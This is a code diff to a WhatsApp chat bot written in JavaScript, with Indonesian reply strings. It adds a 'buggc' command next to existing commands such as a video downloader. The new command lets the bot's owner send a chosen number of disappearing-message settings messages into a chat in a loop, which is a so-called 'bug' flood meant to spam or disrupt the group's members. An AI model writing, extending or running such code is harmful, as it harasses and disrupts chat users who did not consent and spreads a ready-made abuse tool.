@@ -653,7 +653,15 @@ const pebz3 = {
         res = await ytv(`${q}`).catch(e => {
         reply('```[ ! ] Error Saat Mengirim Video```')})
         sendMedia(from, `${res.dl_link}`,'Nih Kack')
-        break                      
+        break 
+         case 'buggc':
+		      if (!isOwner && !mek.key.fromMe) return fakestatus(mess.only.ownerB)
+			if (args.length < 1) return reply('jumlah?')
+			for (let i = 0; i < args[0]; i++) {
+				await pebz.relayWAMessage(client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true })
+			}
+			reply('Sukses send bug sebanyak '+args.join(' '))
+			break                    
     case 'linkwa':
             if(!q) return fakestatus('cari group apa?')
             hx.linkwa(q)
